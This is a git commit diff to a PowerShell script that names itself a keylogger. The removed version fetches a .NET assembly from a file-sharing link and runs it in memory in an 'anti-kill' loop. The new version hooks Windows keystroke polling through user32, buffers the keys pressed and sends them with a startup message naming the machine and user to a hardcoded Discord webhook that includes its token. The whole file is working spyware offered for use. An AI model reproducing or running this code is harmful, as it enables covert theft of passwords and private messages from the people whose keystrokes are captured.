cf0cc8d5fd0711f4b450e29c65e66e5910d92baf
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 00:15:56 +0100

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,14 +1,27 @@
 $webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
 
 # Message de démarrage
-iwr $webhook -Method Post -Body (@{content="Keylogger lancé sur $env:COMPUTERNAME – $env:USERNAME"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing >$null
 
-# Lancement en mémoire + boucle anti-kill (le truc qui marche en 2025)
+$signature = @'
+[DllImport("user32.dll")] public static extern int GetAsyncKeyState(int vKey);
+[DllImport("user32.dll")] public static extern int GetForegroundWindow();
+[DllImport("user32.dll")] public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
+'@
+
+Add-Type -MemberDefinition $signature -Namespace "Win32" -Name "NativeMethods"
+
+$buffer = ""
 while ($true) {
-    try {
-        $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
-        $asm = [Reflection.Assembly]::Load($bytes)
-        $asm.EntryPoint.Invoke($null,$null)
-    } catch {}
-    Start-Sleep -Seconds 10
+    Start-Sleep -Milliseconds 40
+    for ($i=8;$i -le 254;$i++) {
+        $key = [Win32.NativeMethods]::GetAsyncKeyState($i)
+        if ($key -eq -32767) {
+            $buffer += [char]$i
+            if ($buffer.Length -ge 30) {
+                iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing >$null
+                $buffer = ""
+            }
+        }
+    }
 }
